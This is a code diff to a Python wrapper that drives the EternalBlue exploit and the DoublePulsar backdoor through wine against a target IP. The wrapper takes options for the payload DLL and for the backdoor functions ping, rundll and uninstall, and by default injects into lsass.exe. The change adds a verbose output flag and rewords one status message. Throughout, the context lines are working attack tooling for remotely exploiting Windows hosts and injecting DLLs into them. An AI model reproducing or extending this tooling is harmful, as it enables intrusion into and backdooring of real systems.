@@ -20,10 +20,10 @@ quote = "'"
 space = " "
 direct = " > "
 
-dll = rhost = rport = timeout = arch = target = process = function = ""
+dll = rhost = rport = timeout = arch = target = process = function = verbose =""
 
 def getArguments():
-	global dll,rhost,rport,timeout,arch,target,process,function
+	global dll,rhost,rport,timeout,arch,target,process,function,verbose
 	argument_parser.add_argument("-A","--arch",type=str,help="Target host architecture  x64|x86",required=True)
 	argument_parser.add_argument("-V","--version",type=str,help="Target host os version  XP|WIN72K8R2", required=True)
 	argument_parser.add_argument("-H","--host",type=str,help="Target host ip address",required=True)
@@ -32,7 +32,8 @@ def getArguments():
 	argument_parser.add_argument("-D","--dll",type=str,help="Dll payload path",required=True)
 	argument_parser.add_argument("-F","--function",type=str,help="DoublePulsar backdoor function ping|rundll|uninstall",required=True)
 	argument_parser.add_argument("--process",type=str,help="Name of process to inject into",default="lsass.exe")
-	
+	argument_parser.add_argument("--verbose",help="Verbosity",action="store_true",default=False)
+
 	args = argument_parser.parse_args()
 	arch = args.arch
 	target = args.version
@@ -42,6 +43,7 @@ def getArguments():
 	dll = args.dll
 	function = args.function.lower()
 	process = args.process
+	verbose = args.verbose
 
 def banner():
 	from pyfiglet import Figlet
@@ -116,6 +118,10 @@ def run_eternalblue():
 	success = "-=-WIN-="
 	backdoor = "Backdoor is already installed"
 
+	if verbose:
+		show = output.split("<")[0]
+		print show
+
 	if success in output:
 		print term.bold_green("[+] " + "Exploitation successful")
 		return True
@@ -136,10 +142,13 @@ def run_doublepulsar(status):
 		command = "wine "  + doublepulsar_exe
 		ret = commands.getstatusoutput(command)
 		output = ret[1]
+		if verbose:
+			show = output.split("<")[0]
+			print show
 		if fail in output:
 			print term.bold_red("[-] " + "Backdoor not present")
-		elif backdoor in output:
-			print term.bold_green("[+] " + "Backdoor installed successfuly")
+		elif success in output:
+			print term.bold_green("[+] " + "Backdoor detected")
 
 
 	elif status == 3:
@@ -147,6 +156,9 @@ def run_doublepulsar(status):
 		command = "wine "  + doublepulsar_exe
 		ret = commands.getstatusoutput(command)
 		output = ret[1]
+		if verbose:
+			show = output.split("<")[0]
+			print show
 		if fail in output:
 			print term.bold_red("[-] " + "Backdoor not present")
 		elif killed in output:
@@ -156,6 +168,9 @@ def run_doublepulsar(status):
 		command = "wine "  + doublepulsar_exe
 		ret = commands.getstatusoutput(command)
 		output = ret[1]
+		if verbose:
+			show = output.split("<")[0]
+			print show
 		if success in output:
 			print term.bold_green("[+] " + "Dll injected successfuly")
 			return True
@@ -170,6 +185,7 @@ def main():
 	print_info()
 	generate_eternalblue_config()
 	status = generate_doublepulsar_config()
+	
 
 	if status == 2:
 		print term.bold_yellow("[!] Starting EternalBlue")
